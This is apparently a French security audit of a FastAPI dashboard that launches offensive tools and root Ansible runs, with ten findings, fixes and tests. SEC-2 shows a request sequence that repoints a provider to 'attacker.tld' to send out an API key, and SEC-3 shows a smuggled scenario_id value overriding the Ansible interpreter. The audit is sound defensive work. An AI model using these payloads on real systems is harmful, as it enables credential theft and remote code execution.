# 01 — Sécurité de l'API FastAPI

Contexte : l'API (`src/api/`) est exposée sur `:8501` en HTTP non authentifié, sur LAN/Tailscale.
Elle pilote de vrais outils offensifs et lance de l'Ansible **en root** (avec `--vault-password-file`).
Bons points vérifiés : **pas de `shell=True`** (subprocess en liste d'args), `yaml.safe_load` partout,
SQL 100 % paramétré (`?` placeholders). Le risque n'est pas l'injection shell mais l'absence d'auth
et l'injection de paramètres.

---

## SEC-1 — Aucune authentification (BLOCKER)

**Emplacement** : `src/api/main.py:17-37` (app + routers ; aucun `Depends`, aucune middleware d'auth).

**Problème** : aucune route n'exige de credential. Toute personne atteignant `:8501` (tout le
tailnet / segment LAN) peut, sans authentification :
- lancer des runs LLM payants (`POST /api/pipeline/start`, `/batch`),
- **détruire des VMs en production** (`POST /api/pipeline/teardown`),
- arrêter un run (`/stop`),
- réécrire le registre modèles/providers (`POST/PATCH/DELETE /api/models`, `/api/providers`),
- lire tous les artefacts de tous les runs passés (`GET /api/runs/...`).

**Scénario** : un appareil quelconque du tailnet (ou une page web piégée via CSRF, cf. SEC-4)
déclenche `POST /api/pipeline/teardown` → destruction des VMs déployées, sans trace d'auteur.

**Correctif** :
1. Middleware d'auth par **bearer token** (au minimum un secret partagé, idéalement par utilisateur) :
```python
# src/api/auth.py
import hmac, os
from fastapi import Header, HTTPException

API_TOKEN = os.environ["DASHBOARD_API_TOKEN"]  # défini dans .env / vault

def require_auth(authorization: str = Header(default="")):
    scheme, _, token = authorization.partition(" ")
    if scheme.lower() != "bearer" or not hmac.compare_digest(token, API_TOKEN):
        raise HTTPException(status_code=401, detail="Unauthorized")
```
2. Appliquer sur toutes les routes non-GET **et** les GET qui servent des artefacts de run :
```python
app.include_router(pipeline.router, prefix="/api/pipeline",
                   tags=["pipeline"], dependencies=[Depends(require_auth)])
# idem models, providers, runs
```
3. Le front envoie le token (`Authorization: Bearer …`), stocké côté client de façon volontaire
   (prompt de connexion), pas en dur.
4. Défense en profondeur : binder uvicorn sur l'interface tailnet uniquement + ACL Tailscale.
   Ne pas se reposer sur l'accessibilité réseau comme contrôle.

**Effort** : M (½–1 j, + adaptation du front pour porter le token).
**Validation** : toute requête sans `Authorization` valide → 401 ; le dashboard fonctionne avec token.

---

## SEC-2 — API providers : exfiltration de la clé API réelle + SSRF (BLOCKER)

**Emplacement** : `src/api/routes/providers.py:49-72` (`create_provider` / `update_provider`),
consommé par `src/agent/provider.py`.

**Problème** : `base_url` et `api_key_env` sont librement définissables, sans validation. Un
attaquant (non authentifié, cf. SEC-1) crée un provider pointant vers un serveur qu'il contrôle,
y attache un modèle, puis lance un run. Quand l'agent appelle le « LLM », `LLMProvider` lit la
**vraie** clé depuis la variable d'env (`OPENROUTER_API_KEY`) et l'envoie en
`Authorization: Bearer <clé réelle>` vers `http://attacker/` → **clé de production exfiltrée**.
Un `base_url` interne (`http://169.254.169.254/`, hôtes RFC1918) donne aussi une **SSRF aveugle**.

**Scénario** :
```
POST /api/providers  {name:"x", base_url:"http://attacker.tld/v1", api_key_env:"OPENROUTER_API_KEY", kind:"cloud"}
POST /api/models     {slug:"x/pwn", provider:"x", ...}
POST /api/pipeline/start {model:"x/pwn", ...}
→ la clé OPENROUTER_API_KEY part vers attacker.tld
```

**Correctif** :
- Exiger l'auth (SEC-1).
- Valider `base_url` contre une **allowlist** d'hôtes/schémas connus ; interdire les cibles
  link-local et RFC1918 :
```python
from urllib.parse import urlparse
ALLOWED_HOSTS = {"openrouter.ai", "api.anthropic.com", "api.deepseek.com", "api.minimax.chat"}

def validate_base_url(url: str) -> None:
    u = urlparse(url)
    if u.scheme != "https" or u.hostname not in ALLOWED_HOSTS:
        raise HTTPException(422, "base_url non autorisée")
```
- **Épingler** `api_key_env` à une allowlist fixe par provider connu, pour qu'un provider ne
  puisse jamais être repointé vers un autre secret que le sien.

**Effort** : M. **Validation** : impossible de créer un provider vers un hôte hors allowlist ;
tentative de repointage `api_key_env` → 422.

---

## SEC-3 — Injection d'extra-vars Ansible via `scenario_id` (HIGH)

**Emplacement** : `src/api/routes/pipeline.py:412` (route teardown) et
`src/agent/pipeline.py:556` / `:682` — tous construisent
`--extra-vars f"scenario_id={self.scenario_id}"`. `scenario_id` arrive comme `str | None`
libre depuis `StartRequest`/`TeardownRequest`, **sans validation**.

**Problème** : `ansible-playbook --extra-vars "k=v"` traite **l'espace comme séparateur** entre
plusieurs paires `clé=valeur`. Ce n'est pas de l'injection shell (args en liste, pas de
`shell=True`) mais une injection de **variables Ansible** dans un playbook exécuté en root
contre la flotte.

**Scénario** :
```
scenario_id = "1 ansible_python_interpreter=/tmp/evil other=x"
→ surcharge de variables de connexion/interpréteur → exécution potentielle sur les hôtes gérés
```

**Correctif** :
- Valider strictement avant tout passage au subprocess :
```python
import re
_SCENARIO_RE = re.compile(r"^\d+[a-z]?$")   # 1..13, 1h, 4h
def clean_scenario_id(sid: str) -> str:
    if not _SCENARIO_RE.match(sid or ""):
        raise HTTPException(422, "scenario_id invalide")
    return sid
```
- Préférer passer les extra-vars en **JSON** (élimine le découpage par espaces) :
  `--extra-vars '{"scenario_id": "<validé>"}'` ou un fichier de vars.

**Effort** : S. **Validation** : `scenario_id="1 x=y"` → 422 ; les scénarios légitimes passent.

---

## SEC-4 — CORS `*` + credentials, et POST destructifs CSRF-ables (MEDIUM)

**Emplacement** : `src/api/main.py:23-29` — `allow_origins=["*"]`, `allow_credentials=True`,
`allow_methods=["*"]`.

**Problème** : la combinaison `*` + credentials est rejetée par les navigateurs pour les lectures
créditées (config cassée), et l'API n'a de toute façon pas de cookies → le CORS n'apporte **aucune**
protection. Conséquence réelle : le CORS ne bloque jamais l'**envoi** d'un `POST` cross-origin.
Comme les endpoints destructifs sont des POST non authentifiés sans jeton CSRF, **n'importe quelle
page web** visitée par un utilisateur du tailnet peut déclencher
`POST http://<host>:8501/api/pipeline/teardown`. Surface de drive-by / DNS-rebinding.

**Correctif** : allowlist d'origines explicite (l'origine du dashboard), retirer
`allow_credentials` s'il n'est pas nécessaire ; ajouter l'auth (SEC-1) + un jeton CSRF ou l'exigence
d'un header custom sur les routes mutantes.

**Effort** : S. **Validation** : un POST depuis une origine tierce sans header custom/token → refusé.

---

## SEC-5 — Path-traversal : garde mal ancrée, routes zip/score non protégées (MEDIUM)

**Emplacement** : `src/api/routes/runs.py:227-238` (`get_run_file`) ; **aucune** garde sur
`:151-165` (`get_run`), `:207-224` (`download_run`), ni la route `score`.

**Problème** : la garde `filepath.resolve().relative_to(run_dir.resolve())` s'ancre sur
`run_dir = OUTPUT_DIR / run_id`, c.-à-d. un dossier **dérivé du `run_id` non filtré**, pas sur
`OUTPUT_DIR`. Les params de route sont des segments simples (`[^/]+`), ce qui bloque le `../`
évident, mais `run_id`/`filename` restent non validés, le test d'existence précède la garde,
`resolve()` **suit les symlinks**, et les handlers zip/get_run/score font `OUTPUT_DIR / run_id`
sans aucun confinement. `read_text()` charge tout le fichier en mémoire sans plafond.

**Correctif** :
```python
import re
_ID_RE = re.compile(r"^[A-Za-z0-9._-]+$")
def safe_run_id(run_id: str) -> str:
    if not _ID_RE.match(run_id) or run_id in {".", ".."}:
        raise HTTPException(400, "run_id invalide")
    return run_id
# Ancrer TOUTE garde sur OUTPUT_DIR.resolve(), AVANT tout accès disque :
base = OUTPUT_DIR.resolve()
target = (base / run_id / filename).resolve()
if not target.is_relative_to(base):
    raise HTTPException(400, "chemin hors périmètre")
```
Appliquer aussi la garde dans zip / get_run / score ; plafonner la taille de fichier lue.

**Effort** : M. **Validation** : `run_id="../.."` ou filename piégé → 400 ; symlink hors OUTPUT_DIR → refusé.

---

## SEC-6 — Entrées non bornées : coût & DoS (MEDIUM)

**Emplacement** : `src/api/routes/pipeline.py:47-65` (`StartRequest`), `:230-235` (`BatchRequest`).

**Problème** : `max_cost_usd: float | None` sans borne basse (négatif ou `None` = budget illimité →
dépense non plafonnée). `phases: list[int]` non borné/validé. `selected_packs`/`excluded_vulns`/
`batch_ids` non bornés. `batch_ids:["all"]` fanne sur tous les scénarios sans plafond.

**Correctif** : contraintes Pydantic.
```python
from pydantic import Field, conlist, confloat
class StartRequest(BaseModel):
    max_cost_usd: confloat(gt=0, le=50) = 5.0            # défaut + plafond dur
    phases: conlist(int, max_length=6) = Field(default_factory=lambda: [1,2,3,4,5,6])
    # valider chaque phase ∈ {1..6}
```
Borner la taille des batchs et des listes de packs.

**Effort** : S. **Validation** : `max_cost_usd=-1` / `phases=[99]*1000` → 422.

---

## SEC-7 — `/stop` libère `running` trop tôt → pipelines concurrents (MEDIUM)

**Emplacement** : `src/api/routes/pipeline.py:198-207`.

**Problème** : `/stop` met `_state["running"] = False` immédiatement, mais le thread worker ne
vérifie `stop_event` qu'entre phases et continue (y compris un `ansible-playbook` deploy en cours).
Un `/start` suivant passe le test `running` (ligne ~172) et lance un **2ᵉ pipeline concurrent**
partageant le même `_state` global → deux runs se marchent dessus (deploy/teardown Ansible
concurrents sur la même flotte).

**Correctif** : garder `running=True` (ou un état `stopping` qui bloque tout nouveau start)
jusqu'à la **sortie effective** du thread worker ; conserver le handle du thread et refuser
`/start` tant qu'il n'est pas mort (`thread.is_alive()`).

**Effort** : M. **Validation** : stop puis start immédiat → 409 tant que le worker n'a pas fini.

---

## SEC-8 — File SSE globale unique : les clients se volent le flux (MEDIUM)

**Emplacement** : `src/api/routes/pipeline.py:23` (`_state["queue"]`), `:440-462` (`stream_events`).

**Problème** : une seule `asyncio.Queue` partagée. Chaque `q.get()` retire l'événement pour **un
seul** consommateur → avec deux onglets ouverts, chaque événement n'arrive que dans l'un des deux
(flux partiel aléatoire). `recent_events` est aussi une liste globale → les événements d'un 2ᵉ run
rejouent dans l'UI du 1ᵉʳ.

**Correctif** : fan-out par connexion — diffuser chaque événement vers un `set` de queues
abonnées (une par client), ou un pub/sub avec curseur par client. Scoper l'état par `run_id`
plutôt qu'un dict global unique.

**Effort** : M. **Validation** : deux onglets reçoivent le flux complet ; pas de fuite inter-run.

---

## SEC-9 — 500 non gérés sur YAML malformé (LOW)

**Emplacement** : `src/api/routes/scenarios.py:34,48,78` (`yaml.safe_load` sans try/except) ;
`src/api/routes/topology.py:44,46,63,143` (`dev["id"]`, `link["source"]`, `svc["name"]` → `KeyError`).

**Problème** : un YAML mal formé/partiel dans `benchmarks/` provoque une exception non gérée → 500
avec stacktrace, et un seul fichier corrompu casse toute la réponse `list_scenarios`.
(`yaml.safe_load` est correct — pas de RCE de désérialisation.)

**Correctif** : envelopper le parsing par fichier en try/except (skip/annoter les fichiers KO),
utiliser `.get()` avec défauts pour les clés requises.

**Effort** : S. **Validation** : un YAML volontairement cassé n'empêche plus de lister les autres.

---

## SEC-10 — Générateur SSE sans gestion de déconnexion client (LOW)

**Emplacement** : `src/api/routes/pipeline.py:447-462`.

**Problème** : le générateur boucle sur la queue partagée (keep-alive 30 s) sans jamais tester
`request.is_disconnected()`. `sse_starlette` annule la tâche à la déconnexion (donc surtout bénin),
mais combiné à SEC-8, un client déconnecté peut avoir été celui qui a drainé un événement.

**Correctif** : à traiter avec le fan-out de SEC-8 (curseur par client, nettoyage à la déconnexion).

**Effort** : S (fusionné avec SEC-8).

---

## Récapitulatif

| ID | Sévérité | Fichier | Effort |
|---|---|---|---|
| SEC-1 | BLOCKER | `api/main.py:17-37` | M |
| SEC-2 | BLOCKER | `api/routes/providers.py:49-72` | M |
| SEC-3 | HIGH | `api/routes/pipeline.py:412` ; `agent/pipeline.py:556,682` | S |
| SEC-4 | MEDIUM | `api/main.py:23-29` | S |
| SEC-5 | MEDIUM | `api/routes/runs.py:151,207,227` | M |
| SEC-6 | MEDIUM | `api/routes/pipeline.py:47-65,230-235` | S |
| SEC-7 | MEDIUM | `api/routes/pipeline.py:198-207` | M |
| SEC-8 | MEDIUM | `api/routes/pipeline.py:23,440-462` | M |
| SEC-9 | LOW | `api/routes/scenarios.py`,`topology.py` | S |
| SEC-10 | LOW | `api/routes/pipeline.py:447-462` | S |
